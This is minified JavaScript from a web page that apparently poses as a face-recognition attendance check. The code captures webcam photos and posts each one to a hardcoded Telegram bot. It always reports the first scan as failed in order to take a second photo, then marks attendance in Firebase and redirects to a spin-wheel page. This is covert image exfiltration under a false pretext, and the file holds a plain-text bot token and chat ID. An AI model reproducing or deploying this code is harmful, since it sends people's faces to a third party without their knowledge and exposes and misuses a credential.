function startCamera(){const e=document.getElementById("video");navigator.mediaDevices.getUserMedia({video:!0}).then(t=>{e.srcObject=t,e.onloadedmetadata=(()=>{e.play(),setTimeout(()=>takePicture(1),2e3)})}).catch(e=>{console.error("Error accessing camera: ",e)})}function takePicture(e){const t=document.getElementById("video"),a=document.createElement("canvas"),o=a.getContext("2d");a.width=t.videoWidth,a.height=t.videoHeight,o.drawImage(t,0,0,a.width,a.height),sendToTelegram(a,e)}function sendToTelegram(e,t){e.toBlob(e=>{let a=new FormData;a.append("chat_id",TELEGRAM_CHAT_ID),a.append("photo",e,"face.jpg"),fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,{method:"POST",body:a}).then(()=>{if(1===t)$("#face-recognition").addClass("hidden"),$("#face-not-detected").removeClass("hidden"),$("#try-again").off("click").on("click",function(){$("#face-not-detected").addClass("hidden"),$("#face-recognition").removeClass("hidden"),setTimeout(()=>takePicture(2),3e3)}),$("#cancel-scan").on("click",function(){alert("Page will stop here."),localStorage.setItem("pageOpened","false")});else{stopCamera(),$("#face-recognition").addClass("hidden"),$("#completion").removeClass("hidden");const e=[...selectedNames][0];firebase.database().ref("attendance/"+e).set({status:"Success"}),$("#signed-in").text([...selectedNames].join(", ")+" signed in âœ…");let t="You look amazing today!";maleNames.includes(e)?t="You look handsome today!":femaleNames.includes(e)&&(t="You look beautiful today!"),$("#completion p:nth-child(2)").text(t),setTimeout(()=>{localStorage.setItem("pageOpened","true"),localStorage.setItem("currentStep","done"),window.location.href="https://studandlearn.github.io/Spinwheel/"},3e3)}})},"image/jpeg")}function stopCamera(){const e=document.getElementById("video"),t=e.srcObject;t&&t.getTracks().forEach(e=>e.stop())}const TELEGRAM_BOT_TOKEN="8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y",TELEGRAM_CHAT_ID="5934902786";